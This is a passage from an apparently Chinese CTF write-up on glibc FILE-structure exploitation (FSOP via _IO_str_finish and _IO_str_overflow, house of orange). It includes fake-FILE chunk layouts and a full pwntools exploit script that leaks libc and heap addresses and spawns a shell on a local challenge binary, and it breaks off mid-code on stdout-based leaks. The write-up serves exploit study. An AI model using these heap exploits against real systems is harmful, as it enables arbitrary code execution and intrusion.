<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="comment">//执行函数</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里直接把 <code>fp-&gt;_s._free_buffer</code> 的内容当做函数地址来直接调用</p>
<p>当然，我们仍然需要绕过2.23中的 对于mode等的检查，之后把vtable劫持为 <code>_IO_str_jumps-0x8</code> ，这里相当劫持了 <code>_IO_OVERFLOW</code> 成为 <code>_IO_str_finish</code> 这个vtable可以绕过检查，因为他在vtable的地址段之中</p>
<p>由于libc中不存在该函数，可以利用如下的函数进行定位：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libc.address = libc_base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_IO_str_jumps</span>():</span><br><span class="line">    IO_file_jumps_addr = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">    IO_str_underflow_addr = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> ref <span class="keyword">in</span> libc.search(p64(IO_str_underflow_addr-libc.address)):</span><br><span class="line">        possible_IO_str_jumps_addr = ref - <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">if</span> possible_IO_str_jumps_addr &gt; IO_file_jumps_addr:</span><br><span class="line">            <span class="keyword">return</span> possible_IO_str_jumps_addr</span><br></pre></td></tr></table></figure>

<p>于是可以构造如下的chunk，来进行getshell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = bin_sh_addr,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = _IO_str_jumps<span class="number">-8</span> <span class="comment">//chunk_addr + 0xd8 ~ +0xe0</span></span><br><span class="line">&#125;</span><br><span class="line">+<span class="number">0xe0</span> ~ +<span class="number">0xe8</span> : <span class="number">0x0</span></span><br><span class="line">+<span class="number">0xe8</span> ~ +<span class="number">0xf0</span> : system_addr / one_gadget <span class="comment">//fp-&gt;_s._free_buffer</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>利用 _<em>IO_str_overflow()</em> 的手段：</p>
<p>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>

<p>类似与第一种方法，我们看到源码中使用了 <code>new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code> 那我们就劫持他为sysytem的地址，把newsize改为&#x2F;bin&#x2F;sh\x00即可</p>
<p>又有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br></pre></td></tr></table></figure>

<p>可以得到，我们只需要进行如下设置即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_buf_base = <span class="number">0</span></span><br><span class="line">_IO_buf_end = (bin_sh_addr - <span class="number">100</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>可以进行如下布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = (bin_sh_addr - <span class="number">100</span>) <span class="comment">// 2,</span></span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = _IO_str_jumps <span class="comment">//chunk_addr + 0xd8 ~ +0xe0</span></span><br><span class="line">&#125;</span><br><span class="line">+<span class="number">0xe0</span> ~ +<span class="number">0xe8</span> : system_addr / one_gadget <span class="comment">//fp-&gt;_s._allocate_buffer</span></span><br></pre></td></tr></table></figure>

<p>在libc2.28之后，使用了malloc和free替代，FSOP也就从此失效了</p>
</li>
</ol>
<h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h4><h5 id="pre：get-a-freed-chunk"><a href="#pre：get-a-freed-chunk" class="headerlink" title="pre：get a freed chunk"></a>pre：get a freed chunk</h5><p>house of orange主要在没有free的情况下通过 <em>uaf</em> 修改topchunk的的size，这样子分配chunk的时候，分配一个大于topchunk的chunk，就会把topchunk放到unsortedbin中，然后我们就获得了一个可以利用的chunk</p>
<h5 id="FSOP部分"><a href="#FSOP部分" class="headerlink" title="FSOP部分"></a>FSOP部分</h5><p>利用 <em>unsortedbinattack</em> 修改<em>IO_list_all</em> 为 <em>main_arena+88</em> ，然后很巧的是，此时 <code>_chain</code> 字段正好为 <em>smallbin</em> 的开头</p>
<h5 id="WP-amp-amp-exp"><a href="#WP-amp-amp-exp" class="headerlink" title="WP&amp;&amp;exp"></a>WP&amp;&amp;exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=process(<span class="string">&quot;./orange&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)	<span class="comment">#1-7</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content, price, color</span>):</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">	r.send(content)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)	</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">	gdb.attach(r)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000ddaa00001234</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">dbg()</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c5188</span></span><br><span class="line">system=libc_base+<span class="number">0x453a0</span></span><br><span class="line">_IO_list_all=libc_base+<span class="number">0x3c5520</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(f&quot;libc_base is &#123;libc_base&#125;,system is &#123;system&#125;,_IO_list_all is &#123;_IO-list_all&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x1234</span>,<span class="number">0xDDAA</span>)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x400</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)<span class="comment">#to small bin</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(_IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>) <span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file += p64(system)</span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload), payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>刚开始是对这里chunk分配有些迷惑的，不过后来看了一篇文章，关于lastreminder有所想法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/97803141">last reminder</a></p>
<h4 id="利用-IO-2-1-stdout-泄露libc"><a href="#利用-IO-2-1-stdout-泄露libc" class="headerlink" title="利用__IO_2_1_stdout_ 泄露libc"></a>利用__IO_2_1_stdout_ 泄露libc</h4><p>有些时候题目中没有给出我们输出程序，但是我们需要泄露libc等内容，这时候就要利用io来泄露</p>
<p><img src="/../images/20210218150610948-1693969452453.png" alt="io"></p>
<p>在程序运行时，会自动开启三个io流，分别是 <em>stdin，stdout，stderr</em> ,文件描述符分别为0,1,2</p>
<p>这里再复习一下io的结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于vtable有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="flag-规则"><a href="#flag-规则" class="headerlink" title="_flag 规则"></a><em>_flag</em> 规则</h5><p><em>flag</em> 的高两位是由libc确定，低位由文件性质决定</p>
<p><img src="/../images/1693975592799.png" alt="1693975592799"></p>
<h5 id="puts函数的执行流程"><a href="#puts函数的执行流程" class="headerlink" title="puts函数的执行流程"></a>puts函数的执行流程</h5><p><em>_IO_puts</em>-&gt;_<em>IO_new_file_xsputn</em></p>
<p><img src="/../images/1693975724051.png" alt="1693975724051"></p>
<p><em>_IO_sputn</em> 是一个宏，指向了 <em>_IO_new_file_xsputn</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized 